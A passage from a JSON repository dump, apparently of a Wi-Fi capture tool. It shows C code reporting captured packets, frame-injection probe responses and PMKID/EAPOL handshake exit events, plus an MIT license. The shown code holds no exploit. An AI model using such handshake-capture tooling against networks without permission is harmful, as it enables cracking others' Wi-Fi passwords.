kernel\\n\", lStats.tp_packets);\nfprintf(stdout, \"%u Packet(s) dropped by kernel\\n\", lStats.tp_drops);\nif(lStats.tp_packets < 10) fprintf(stderr, \"Warning: too less packets received (monitor mode may not work as expected)\\n\"\n\t\t\t\"Possible reasons:\\n\"\n\t\t\t\" driver is broken (most likely)\\n\"\n\t\t\t\" no transmitter in range\\n\"\n\t\t\t\" frames are filtered out by BPF\\n\");\n#ifdef HCXSTATUSOUT\nif(rcascanflag == NULL)\n\t{\n\tfprintf(stdout,\"%ld SHB written to pcapng dumpfile\\n\", wshbcount);\n\tfprintf(stdout,\"%ld IDB written to pcapng dumpfile\\n\", widbcount);\n\tfprintf(stdout,\"%ld ECB written to pcapng dumpfile\\n\", wecbcount);\n\tfprintf(stdout,\"%ld EPB written to pcapng dumpfile\\n\", wepbcount);\n\t}\nelse\n\t{\n\tif(rcascanflag[0] == 'a')\n\t\t{\n\t\tif(packetrcarxcount > 0) fprintf(stdout, \"%\" PRIu64 \" PROBERESPONSE(s) captured\\n\", packetrcarxcount);\n\t\telse fprintf(stderr, \"Warning: no PROBERESPONSES received (frame injection may not work as expected)\\n\"\n\t\t\t\t\t\"Possible reasons:\\n\"\n\t\t\t\t\t\" no AP in range\\n\"\n\t\t\t\t\t\" frames are filtered out by BPF\\n\"\n\t\t\t\t\t\" driver is broken\\n\"\n\t\t\t\t\t\" driver does not support frame injection\\n\\n\");\n\t\t}\n\t}\n#endif\n#ifdef HCXNMEAOUT\nif(nmeapacketcount > 0) fprintf(stdout, \"%ld NMEA sentence(s) received from device\\n\", nmeapacketcount);\nif(wecbnmeacount > 0) fprintf(stdout, \"%ld ECB NMEA written to pcapng dumpfile\\n\", wecbnmeacount);\nif(wgpwplcount > 0)   fprintf(stdout, \"%ld GPWPL record(s) written to file\\n\", wgpwplcount);\n#endif\nfprintf(stdout, \"\\n\");\nif(exiteapolflag != 0)\n\t{\n\tif((wanteventflag & EXIT_ON_EAPOL_PMKID) == EXIT_ON_EAPOL_PMKID) fprintf(stdout, \"exit on PMKID\\n\");\n\tif((wanteventflag & EXIT_ON_EAPOL_M3) == EXIT_ON_EAPOL_M3) fprintf(stdout, \"exit on EAPOL M1M2M3\\n\");\n\tif((wanteventflag & EXIT_ON_EAPOL_M2) == EXIT_ON_EAPOL_M2) fprintf(stdout, \"exit on EAPOL M1M2\\n\");\n\tif((wanteventflag & EXIT_ON_EAPOL_M1) == EXIT_ON_EAPOL_M1) fprintf(stdout, \"exit on EAPOL M1\\n\");\n\t}\nif((wanteventflag & EXIT_ON_SIGTERM) == EXIT_ON_SIGTERM)\n\t{\n\tfprintf(stdout, \"exit on sigterm\\n\");\n\tif(exitsigtermflag == EXIT_ACTION_REBOOT)\n\t\t{\n\t\tif(system(\"reboot\") != 0) fprintf(stderr, \"can't reboot system\\n\");\n\t\t}\n\telse if(exitsigtermflag == EXIT_ACTION_POWEROFF)\n\t\t{\n\t\tif(system(\"poweroff\") != 0) fprintf(stderr, \"can't power off\\n\");\n\t\t}\n\t}\nelse if((wanteventflag & EXIT_ON_GPIOBUTTON) == EXIT_ON_GPIOBUTTON)\n\t{\n\tfprintf(stdout, \"exit on GPIO button\\n\");\n\tif(exitgpiobuttonflag == EXIT_ACTION_REBOOT)\n\t\t{\n\t\tif(system(\"reboot\") != 0) fprintf(stderr, \"can't reboot system\\n\");\n\t\t}\n\telse if(exitgpiobuttonflag == EXIT_ACTION_POWEROFF)\n\t\t{\n\t\tif(system(\"poweroff\") != 0) fprintf(stderr, \"can't power off\\n\");\n\t\t}\n\t}\nelse if((wanteventflag & EXIT_ON_TOT) == EXIT_ON_TOT)\n\t{\n\tfprintf(stdout, \"exit on TOT\\n\");\n\tif(exittotflag == EXIT_ACTION_REBOOT)\n\t\t{\n\t\tif(system(\"reboot\") != 0) fprintf(stderr, \"can't reboot system\\n\");\n\t\t}\n\telse if(exittotflag == EXIT_ACTION_POWEROFF)\n\t\t{\n\t\tif(system(\"poweroff\") != 0) fprintf(stderr, \"can't power off\\n\");\n\t\t}\n\t}\nelse if((wanteventflag & EXIT_ON_WATCHDOG) == EXIT_ON_WATCHDOG)\n\t{\n\tfprintf(stdout, \"exit on watchdog\\n\");\n\tif(exitwatchdogflag == EXIT_ACTION_REBOOT)\n\t\t{\n\t\tif(system(\"reboot\") != 0) fprintf(stderr, \"can't reboot system\\n\");\n\t\t}\n\telse if(exitwatchdogflag == EXIT_ACTION_POWEROFF)\n\t\t{\n\t\tif(system(\"poweroff\") != 0) fprintf(stderr, \"can't power off\\n\");\n\t\t}\n\t}\nelse if((wanteventflag & EXIT_ON_ERROR) == EXIT_ON_ERROR)\n\t{\n\tfprintf(stdout, \"exit on error\\n\");\n\tif(exiterrorflag == EXIT_ACTION_REBOOT)\n\t\t{\n\t\tif(system(\"reboot\") != 0) fprintf(stderr, \"can't reboot system\\n\");\n\t\t}\n\telse if(exiterrorflag == EXIT_ACTION_POWEROFF)\n\t\t{\n\t\tif(system(\"poweroff\") != 0) fprintf(stderr, \"can't power off\\n\");\n\t\t}\n\t}\nreturn EXIT_SUCCESS;\n}\n/*===========================================================================*/\n"
        },
        {
          "name": "include",
          "type": "tree",
          "content": null
        },
        {
          "name": "license.txt",
          "type": "blob",
          "size": 1.0556640625,
          "content": "The MIT License (MIT)\n\nCopyright (c) 2000-2025 ZeroBeat\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n"
        },
        {
          "name": "man",
          "type": "tree",
          "content": null
        },
        {
          "name": "usefulscripts",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}